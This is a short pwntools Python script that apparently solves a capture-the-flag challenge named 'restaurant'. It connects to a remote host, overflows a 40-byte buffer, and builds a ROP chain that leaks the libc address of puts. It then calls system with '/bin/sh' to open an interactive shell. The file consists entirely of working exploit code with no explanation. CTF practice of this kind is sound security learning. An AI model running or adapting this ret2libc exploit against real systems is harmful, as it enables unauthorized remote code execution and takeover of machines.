#!/usr/bin/env python3

from pwn import *
p = remote("161.35.174.3" ,32644)
#p = process("./restaurant_patched")
#gdb.attach(p, api=True)

pop_rdi = 0x00000000004010a3
ret = 0x000000000040063e
main = 0x0000000000400f68
puts_plt = 0x0000000000400650
puts_got = 0x601fa8
puts_libc = 0x0000000000080aa0

payload = b"1"
p.sendline(payload)

payload = b'A'*40					#loop to fill
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(main)
p.sendline(payload)


p.recvuntil(b">\x06\x40")					#leak_stdin_addr
puts_offset = int.from_bytes(p.recv(6), "little")

print(hex(puts_offset))


payload = b"1"
p.sendline(payload)

system_offset = 0x000000000004f550
binsh_offset = 0x1b3e1a

libc_base = puts_offset - puts_libc
system = system_offset + libc_base
binsh = binsh_offset + libc_base 


payload = b"a"*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)

p.interactive()
